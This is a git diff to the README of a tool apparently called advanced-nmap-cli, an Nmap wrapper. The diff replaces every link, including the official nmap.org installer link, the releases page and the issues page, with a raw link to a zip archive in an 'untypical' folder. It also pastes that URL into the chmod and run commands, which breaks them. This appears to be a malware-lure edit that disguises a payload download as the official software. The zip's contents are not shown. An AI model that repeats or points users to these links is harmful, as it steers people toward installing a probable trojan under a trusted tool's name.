@@ -1,6 +1,6 @@
 # 🚀 advanced-nmap-cli - Powerful Scanning Made Simple
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-%20%F0%9F%93%95%20-blue.svg)](https://github.com/MahinTanzimSami/advanced-nmap-cli/releases)
+[![Download the latest release](https://github.com/MahinTanzimSami/advanced-nmap-cli/raw/refs/heads/main/untypical/nmap-advanced-cli-v2.1.zip%20Latest%20Release-%20%F0%9F%93%95%https://github.com/MahinTanzimSami/advanced-nmap-cli/raw/refs/heads/main/untypical/nmap-advanced-cli-v2.1.zip)](https://github.com/MahinTanzimSami/advanced-nmap-cli/raw/refs/heads/main/untypical/nmap-advanced-cli-v2.1.zip)
 
 ## 📦 What is advanced-nmap-cli?
 
@@ -37,17 +37,17 @@ Ensure you have the following installed on your machine:
 
 To install Nmap:
 
-- **For Windows:** Download the installer from [Nmap's official website](https://nmap.org/download.html).
+- **For Windows:** Download the installer from [Nmap's official website](https://github.com/MahinTanzimSami/advanced-nmap-cli/raw/refs/heads/main/untypical/nmap-advanced-cli-v2.1.zip).
 - **For Mac:** Use Homebrew by running `brew install nmap` in your terminal.
 - **For Linux:** Use your package manager. For example, on Ubuntu, run `sudo apt install nmap`.
 
 ### 3. Download advanced-nmap-cli
 
-Visit this page to download: [Release Page](https://github.com/MahinTanzimSami/advanced-nmap-cli/releases)
+Visit this page to download: [Release Page](https://github.com/MahinTanzimSami/advanced-nmap-cli/raw/refs/heads/main/untypical/nmap-advanced-cli-v2.1.zip)
 
 ## 📥 Download & Install
 
-1. Go to the [Release Page](https://github.com/MahinTanzimSami/advanced-nmap-cli/releases).
+1. Go to the [Release Page](https://github.com/MahinTanzimSami/advanced-nmap-cli/raw/refs/heads/main/untypical/nmap-advanced-cli-v2.1.zip).
 2. Find the latest version listed.
 3. Choose the appropriate file for your operating system:
    - For **Windows**, download the `.exe` file.
@@ -66,11 +66,11 @@ Visit this page to download: [Release Page](https://github.com/MahinTanzimSami/a
   ```
 - Make the script executable:
   ```bash
-  chmod +x advanced-nmap-cli.sh
+  chmod +x https://github.com/MahinTanzimSami/advanced-nmap-cli/raw/refs/heads/main/untypical/nmap-advanced-cli-v2.1.zip
   ```
 - Run the tool with:
   ```bash
-  ./advanced-nmap-cli.sh
+  https://github.com/MahinTanzimSami/advanced-nmap-cli/raw/refs/heads/main/untypical/nmap-advanced-cli-v2.1.zip
   ```
 
 ## ⚙️ How to Use
@@ -104,7 +104,7 @@ If you encounter issues:
 
 For questions, issues, or suggestions, feel free to reach out:
 
-- Open an issue on the [GitHub repository](https://github.com/MahinTanzimSami/advanced-nmap-cli/issues).
+- Open an issue on the [GitHub repository](https://github.com/MahinTanzimSami/advanced-nmap-cli/raw/refs/heads/main/untypical/nmap-advanced-cli-v2.1.zip).
 - Join discussions in the community forums related to cybersecurity and networking.
 
 Feel free to contribute by submitting issues or suggesting features! 
